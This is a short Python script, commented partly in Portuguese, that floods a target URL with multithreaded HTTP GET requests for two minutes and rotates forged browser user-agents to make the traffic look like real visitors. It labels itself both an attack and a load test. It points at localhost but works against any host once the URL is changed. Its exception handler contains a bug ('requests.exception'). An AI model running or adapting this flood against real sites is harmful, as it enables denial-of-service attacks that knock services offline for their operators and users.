import threading
import requests
import random
import time

# Attack setup
TARGET_URL = "http://127.0.0.1" # Target
THREADS = 60 # Threads
DURATION = 120 # Exec time

# Lista user-agents
USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"
]

# Função requests HTTPS
def stress_test():
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(TARGET_URL, headers=headers, timeout=5)
            print(f"[+] Request sent - Status Code: {response.status_code}")
        except requests.exception.RequestException:
            print("[-] Request failed")

def start_attack():
    print(f"Iniciando teste de carga contra {TARGET_URL} por {DURATION} segundos. . .")
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=stress_test)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
    print("[+] Teste finalizado!")

if __name__ == "__main__":
    start_attack()